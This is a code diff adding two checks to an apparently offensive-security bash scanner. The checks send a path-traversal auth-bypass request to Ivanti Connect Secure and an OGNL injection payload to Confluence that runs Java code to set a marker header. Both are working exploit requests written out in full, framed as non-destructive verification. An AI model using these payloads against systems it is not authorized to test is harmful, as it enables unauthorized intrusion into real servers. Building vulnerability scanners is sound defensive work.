@@ -987,6 +987,62 @@ check_NGINX_CVE_2026_42945() {
 }
 
 #############################################################################
+# 33. Ivanti Connect Secure VPN (CVE-2023-46805 / CVE-2024-21887)
+# Zero false-positive Auth Bypass check.
+#############################################################################
+check_IVANTI_RCE() {
+    local url=$1 domain=$2
+    _tz_reset_hit
+    local base_url="${url%%\?*}"
+    
+    # Path Traversal payload, который обходит фильтры Ivanti
+    local test_url="${base_url}/api/v1/totp/user-backup-code/../../system/system-information"
+    
+    local response
+    response=$(curl -s -k --max-time 5 "$test_url")
+
+    # Если мы смогли без авторизации прочитать системную информацию устройства
+    if echo "$response" | grep -q '"build-version"' && echo "$response" | grep -q '"system-information"'; then
+        local build_version
+        build_version=$(echo "$response" | grep -o '"build-version":"[^"]*"' | cut -d'"' -f4)
+        
+        TZ_HIT_POC="$test_url"
+        TZ_HIT_PROOF="Ivanti Auth Bypass / RCE Verified. Build Version exposed: ${build_version}"
+        return 1
+    fi
+
+    return 0
+}
+
+#############################################################################
+# 34. Confluence OGNL RCE (CVE-2023-22527 / CVE-2022-26134)
+# Header injection trick for 100% blind verification without crashing.
+#############################################################################
+check_CONFLUENCE_RCE() {
+    local url=$1 domain=$2
+    _tz_reset_hit
+    local base_url="${url%%\?*}"
+    
+    local test_url="${base_url}/template/aui/text-inline.vm"
+    
+    # Мы не крашим сервер и не запускаем bash. Мы заставляем OGNL-парсер Java 
+    # добавить кастомный HTTP-заголовок в ответ. Это самый безопасный RCE-proof.
+    local payload="label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-TerminatorZ-RCE','Vulnerable')"
+    
+    local headers
+    headers=$(curl -s -k -I -X POST -d "$payload" -H "Content-Type: application/x-www-form-urlencoded" --max-time 5 "$test_url")
+
+    # Если сервер вернул наш заголовок — это 100% RCE (выполнение Java-кода).
+    if echo "$headers" | grep -qiE '^X-TerminatorZ-RCE:[[:space:]]*Vulnerable'; then
+        TZ_HIT_POC="$test_url"
+        TZ_HIT_PROOF="Confluence RCE Verified: Injected Java code successfully set custom HTTP response header."
+        return 1
+    fi
+
+    return 0
+}
+
+#############################################################################
 # Asset-type filter — classifies URLs as "static asset" vs "dynamic".
 # Static assets (.js/.css/.png/etc.) only get header-based checks; injection
 # checks are skipped. This speeds up scans massively on sites with lots of
